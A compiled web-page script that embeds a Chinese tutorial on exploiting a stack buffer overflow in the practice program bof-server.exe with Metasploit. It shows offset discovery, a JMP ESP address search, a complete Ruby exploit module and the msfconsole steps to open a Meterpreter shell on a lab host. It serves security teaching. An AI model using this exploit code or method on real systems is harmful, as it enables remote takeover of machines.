import{i as e,r as t,s as n,t as r}from"./app-C53NY-cV.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-05-02-013-%E4%BD%BF%E7%94%A8Metasploit%E5%AE%9E%E7%8E%B0%E5%AF%B9%E7%BC%93%E5%86%B2%E5%8C%BA%E6%A0%88%E7%9A%84%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB.html","title":"使用Metasploit实现对缓冲区栈的溢出攻击","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"使用Metasploit实现对缓冲区栈的溢出攻击","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"使用Metasploit实现对缓冲区栈的溢出攻击","lock":"need"},"git":{"updatedTime":1777479520000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"7b4fb9b490c0240f5c694694f3fbc97d93e36561","time":1777479520000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: 升级到vuepress2"}]},"filePathRelative":"md/hack/tools/2022-05-02-013-使用Metasploit实现对缓冲区栈的溢出攻击.md"}`),a={name:`2022-05-02-013-使用Metasploit实现对缓冲区栈的溢出攻击.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="使用metasploit实现对缓冲区栈的溢出攻击" tabindex="-1"><a class="header-anchor" href="#使用metasploit实现对缓冲区栈的溢出攻击"><span>使用Metasploit实现对缓冲区栈的溢出攻击</span></a></h1><p>这里我们不说理论，只讲实战，以Metasploit溢出bof-server.exe为例。</p><h3 id="下载工具" tabindex="-1"><a class="header-anchor" href="#下载工具"><span>下载工具</span></a></h3><p>这里需要下载bof-server.exe和ImmunityDebugger</p><p>bof-server.exe 下载地址为：[http://redstack.net/blog/category/How%20To.html](http://redstack.net/blog/category/How To.html)</p><p>ImmunityDebugger下载地址为：<a href="http://www.immunityinc.com/products/debugger/" target="_blank" rel="noopener noreferrer">http://www.immunityinc.com/products/debugger/ </a></p><p>或者 https://download.csdn.net/download/l1028386804/10918212</p><h3 id="开启bof-server-exe监听端口" tabindex="-1"><a class="header-anchor" href="#开启bof-server-exe监听端口"><span>开启bof-server.exe监听端口</span></a></h3><p>这里，我们监听200端口，具体方法为：打开cmd命令行，切换到bof-server.exe所在的目录后执行如下命令：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">bof-server.exe 200</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>此时，sof-server便开始监听200端口了。</p><h3 id="生成字符序列" tabindex="-1"><a class="header-anchor" href="#生成字符序列"><span>生成字符序列</span></a></h3><p>我们使用Metasploit中的pattern_create.rb脚本生成字符序列。首先我们查看以下pattern_create.rb脚本的帮助信息，在Kali命令行输入如下信息：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">root@binghe:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -h</span>
<span class="line">Usage: msf-pattern_create [options]</span>
<span class="line">Example: msf-pattern_create -l 50 -s ABC,def,123</span>
<span class="line">Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf</span>
<span class="line"></span>
<span class="line">Options:</span>
<span class="line">    -l, --length &lt;length&gt;            The length of the pattern</span>
<span class="line">    -s, --sets &lt;ABC,def,123&gt;         Custom Pattern Sets</span>
<span class="line">    -h, --help                       Show this message</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到我们只要在pattern_create.rb脚本的后面加上&quot;-l 字符序列长度&quot;就可以生成指定长度的字符序列。这里，我们生成一个长度为1000的字符序列。</p><p>输入命令如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">root@binghe:~# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000</span>
<span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到我们生成了一个1000的字符序列</p><h3 id="将生成的字符序列发送到bof-server-exe监听的端口" tabindex="-1"><a class="header-anchor" href="#将生成的字符序列发送到bof-server-exe监听的端口"><span>将生成的字符序列发送到bof-server.exe监听的端口</span></a></h3><p>接下来我们将这个字符序列发送到bof-server.exe监听的端口。</p><p>首先我们通过telnet连接上bof-server.exe。</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">root@binghe:~# telnet 192.168.109.141 200</span>
<span class="line">Trying 192.168.109.141...</span>
<span class="line">Connected to 192.168.109.141.</span>
<span class="line">Escape character is &#39;^]&#39;.</span>
<span class="line"></span>
<span class="line">&gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>接下来我们发送字符序列，将第3步生成的字符序列复制到telnet终端，回车。</p><h3 id="查看bof-server-exe命令行" tabindex="-1"><a class="header-anchor" href="#查看bof-server-exe命令行"><span>查看bof-server.exe命令行</span></a></h3><p>接着，我们查看bof-server.exe命令行状态，可以看到如下图所示：</p><p><img src="https://img-blog.csdnimg.cn/20190115162121672.png" alt="img"></p><p>说明bof-server.exe程序发生了溢出。我们单击“请单击此处”查看详情，如下：</p><p><img src="https://img-blog.csdnimg.cn/20190115162138902.png" alt="img"></p><p>可以看到Offset的值为：72413372</p><h3 id="找出准确字节数量" tabindex="-1"><a class="header-anchor" href="#找出准确字节数量"><span>找出准确字节数量</span></a></h3><p>这里我们用到的工具是Metasploit下的pattern_offset.rb，首先我们先查看pattern_offset.rb脚本的帮助信息，输入如下命令：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">root@binghe:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -h</span>
<span class="line">Usage: msf-pattern_offset [options]</span>
<span class="line">Example: msf-pattern_offset -q Aa3A</span>
<span class="line">[*] Exact match at offset 9</span>
<span class="line"></span>
<span class="line">Options:</span>
<span class="line">    -q, --query Aa0A                 Query to Locate</span>
<span class="line">    -l, --length &lt;length&gt;            The length of the pattern</span>
<span class="line">    -s, --sets &lt;ABC,def,123&gt;         Custom Pattern Sets</span>
<span class="line">    -h, --help                       Show this message</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到-q参数为要查询的地址，-l参数为要查询的字符序列的长度。</p><p>根据第5步我们得出地址为：72413372，前面我们生成的字符序列的长度为1000</p><p>所以，我们输入如下命令来得出准确字节的数量</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">root@binghe:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 72413372 -l 1000</span>
<span class="line">[*] Exact match at offset 520</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到得出的结果为520</p><h3 id="分析bof-server-exe运行时加载的dll文件" tabindex="-1"><a class="header-anchor" href="#分析bof-server-exe运行时加载的dll文件"><span>分析bof-server.exe运行时加载的DLL文件</span></a></h3><p>这里，我们通过工具ImmunityDebugger工具来分析bof-server.exe运行时加载的DLL文件，可以到http://www.immunityinc.com/products/debugger/ 或者 https://download.csdn.net/download/l1028386804/10918212 下载。</p><p>具体操作如下：</p><p>打开ImmunityDebugger-&gt;File-&gt;Attach，来显示目标机上运行的所有进程。</p><p><img src="https://img-blog.csdnimg.cn/20190115162431740.png" alt="img"></p><p>打开之后，我们看到了目标机上的所有进程如下，同时，我们找到名称为bof-server.exe的进程，如下所示：</p><p><img src="https://img-blog.csdnimg.cn/20190115162512512.png" alt="img"></p><p>接下来，我们选中bof-server.exe进程，单击右下角的Attach按钮</p><p><img src="https://img-blog.csdnimg.cn/2019011516252913.png" alt="img"></p><p>此时，显示的是bof-server.exe的一些运行信息，如下：</p><p><img src="https://img-blog.csdnimg.cn/20190115162600358.png" alt="img"></p><p>接下来我们选择View-&gt;Executable modules，如下图：</p><p><img src="https://img-blog.csdnimg.cn/20190115162625865.png" alt="img"></p><p>点击后的效果如下图所示：</p><p><img src="https://img-blog.csdnimg.cn/20190115162648673.png" alt="img"></p><p>这里，就是bof-server.exe运行加载的所有DLL文件了。这里我们选择一个ws2_32.dll文件上传到Kali的/root目录下，通过Metasploit的msfbinscan查找JMP ESP指令的地址。</p><h3 id="查找jmp-esp指令的地址" tabindex="-1"><a class="header-anchor" href="#查找jmp-esp指令的地址"><span>查找JMP ESP指令的地址</span></a></h3><p>这里，我们用到的工具是Metasploit下的msfbinscan。首先我们要进入msf命令行，在Kali终端下输入如下命令：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msfconsole</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>查看msfbinscan的帮助信息，如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msf &gt; msfbinscan -h</span>
<span class="line">[*] exec: msfbinscan -h</span>
<span class="line"></span>
<span class="line">Usage: /usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/bin/msfbinscan [mode] &lt;options&gt; [targets]</span>
<span class="line"></span>
<span class="line">Modes:</span>
<span class="line">    -j, --jump [regA,regB,regC]      Search for jump equivalent instructions        [PE|ELF|MACHO]</span>
<span class="line">    -p, --poppopret                  Search for pop+pop+ret combinations            [PE|ELF|MACHO]</span>
<span class="line">    -r, --regex [regex]              Search for regex match                         [PE|ELF|MACHO]</span>
<span class="line">    -a, --analyze-address [address]  Display the code at the specified address      [PE|ELF]</span>
<span class="line">    -b, --analyze-offset [offset]    Display the code at the specified offset       [PE|ELF]</span>
<span class="line">    -f, --fingerprint                Attempt to identify the packer/compiler        [PE]</span>
<span class="line">    -i, --info                       Display detailed information about the image   [PE]</span>
<span class="line">    -R, --ripper [directory]         Rip all module resources to disk               [PE]</span>
<span class="line">        --context-map [directory]    Generate context-map files                     [PE]</span>
<span class="line"></span>
<span class="line">Options:</span>
<span class="line">    -A, --after [bytes]              Number of bytes to show after match (-a/-b)    [PE|ELF|MACHO]</span>
<span class="line">    -B, --before [bytes]             Number of bytes to show before match (-a/-b)   [PE|ELF|MACHO]</span>
<span class="line">    -I, --image-base [address]       Specify an alternate ImageBase                 [PE|ELF|MACHO]</span>
<span class="line">    -D, --disasm                     Disassemble the bytes at this address          [PE|ELF]</span>
<span class="line">    -F, --filter-addresses [regex]   Filter addresses based on a regular expression [PE]</span>
<span class="line">    -h, --help                       Show this message</span>
<span class="line">msf &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>接下来我们输入如下命令来获取JMP ESP指令的地址：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msf &gt; msfbinscan -j esp /root/ws2_32.dll</span>
<span class="line">[*] exec: msfbinscan -j esp /root/ws2_32.dll</span>
<span class="line"></span>
<span class="line">[/root/ws2_32.dll]</span>
<span class="line">0x71a22b53 push esp; ret</span>
<span class="line">msf &gt; </span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到，我们得出的JMP ESP指令的地址为：0x71a22b53</p><h3 id="编写攻击脚本bof-server-attack-rb" tabindex="-1"><a class="header-anchor" href="#编写攻击脚本bof-server-attack-rb"><span>编写攻击脚本bof_server_attack.rb</span></a></h3><p>接下来，我们就要编写攻击脚本bof_server_attack.rb了，这里不多说了，直接上代码：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">##</span>
<span class="line"># Author 冰河</span>
<span class="line"># Date 2019-01-15</span>
<span class="line"># Description 缓冲区溢出sof-server从而拿下目标服务器Meterpreter Shell</span>
<span class="line">##</span>
<span class="line"></span>
<span class="line">require &#39;msf/core&#39;</span>
<span class="line">class Metasploit3 &lt; Msf::Exploit::Remote</span>
<span class="line">  Rank = NormalRanking</span>
<span class="line">  include Msf::Exploit::Remote::Tcp</span>
<span class="line">  </span>
<span class="line">  def initialize(info = {})</span>
<span class="line">  super(update_info(info,</span>
<span class="line">    &#39;Name&#39; =&gt; &#39;Stack Based Buffer Overflow Example&#39;,</span>
<span class="line">    &#39;Description&#39; =&gt; %q{</span>
<span class="line">      Stack Based Overflow Example Application Exploitation Module</span>
<span class="line">    },</span>
<span class="line">    &#39;Platform&#39; =&gt; &#39;WIndows&#39;,</span>
<span class="line">    &#39;Author&#39; =&gt; </span>
<span class="line">      [</span>
<span class="line">        &#39;binghe&#39;</span>
<span class="line">      ],</span>
<span class="line">      </span>
<span class="line">     &#39;Payload&#39; =&gt;</span>
<span class="line">      {</span>
<span class="line">        &#39;space&#39; =&gt; 1000,</span>
<span class="line">        &#39;BadChars&#39; =&gt; &quot;\\x00\\xff&quot;</span>
<span class="line">      },</span>
<span class="line">     &#39;Targets&#39; =&gt;</span>
<span class="line">      [</span>
<span class="line">        [&#39;Windows XP SP3&#39;, {&#39;Ret&#39; =&gt; 0x71a22b53, &#39;Offset&#39; =&gt; 520}]</span>
<span class="line">      ],</span>
<span class="line">     &#39;DisclosureDate&#39; =&gt; &#39;2019-01-15&#39;</span>
<span class="line">  ))</span>
<span class="line">  </span>
<span class="line">  register_options(</span>
<span class="line">  [</span>
<span class="line">    Opt::RPORT(200)</span>
<span class="line">  ],self.class)</span>
<span class="line">  end</span>
<span class="line">  </span>
<span class="line">  def exploit</span>
<span class="line">    connect</span>
<span class="line">    buf = make_nops(target[&#39;Offset&#39;])</span>
<span class="line">    buf = buf + [target[&#39;Ret&#39;]].pack(&#39;V&#39;) + make_nops(20) + payload.encoded</span>
<span class="line">    sock.put(buf)</span>
<span class="line">    handler</span>
<span class="line">    disconnect</span>
<span class="line">   end</span>
<span class="line">end</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>要注意的是：</strong></p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">&#39;Targets&#39; =&gt;</span>
<span class="line">  [</span>
<span class="line">    [&#39;Windows XP SP3&#39;, {&#39;Ret&#39; =&gt; 0x71a22b53, &#39;Offset&#39; =&gt; 520}]</span>
<span class="line">  ],</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>中的<strong>Ret的值要和第8步中我们找到的JMP ESP指令的地址一致， Offset的值要和第6步中找出的准确字节数一致。</strong></p><h3 id="上传bof-server-attack-rb脚本" tabindex="-1"><a class="header-anchor" href="#上传bof-server-attack-rb脚本"><span>上传bof_server_attack.rb脚本</span></a></h3><p>将bof_server_attack.rb脚本上传到Kali的/usr/share/metasploit-framework/modules/exploits/windows/masteringmetasploit/目录下。</p><h3 id="运行攻击脚本" tabindex="-1"><a class="header-anchor" href="#运行攻击脚本"><span>运行攻击脚本</span></a></h3><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">msfconsole</span>
<span class="line">use exploit/windows/masteringmetasploit/bof_server_attack</span>
<span class="line">set payload windows/meterpreter/bind_tcp</span>
<span class="line">show options</span>
<span class="line">set RHOST 192.168.109.141</span>
<span class="line">show options</span>
<span class="line">exploit</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>此时我们拿到了目标服务器的Meterpreter Shell，如下图所示：</p><p><img src="https://img-blog.csdnimg.cn/20190115163113304.png" alt="img"></p><p>此时，我们查看目标服务器的bof-server.exe终端，如下图所示：</p><p><img src="https://img-blog.csdnimg.cn/20190115163127479.png" alt="img"></p><h3 id="可能出现的问题" tabindex="-1"><a class="header-anchor" href="#可能出现的问题"><span>可能出现的问题</span></a></h3><p>有时我们运行exploit进行渗透拿Meterpreter Shell的时候，会出现不成功的情况，具体如下图：</p><p><img src="https://img-blog.csdnimg.cn/20190115163145761.png" alt="img"></p><p>此时，查看目标机的bof-server.exe命令行的缓冲区溢出并断开了监听。</p><p><img src="https://img-blog.csdnimg.cn/20190115163207581.png" alt="img"></p><p>此时，只需要在目标机上多运行几次bof-server.exe 200和在Kali上多运行几次exploit，直到成功拿到Meterpreter Shell。</p><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,84)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};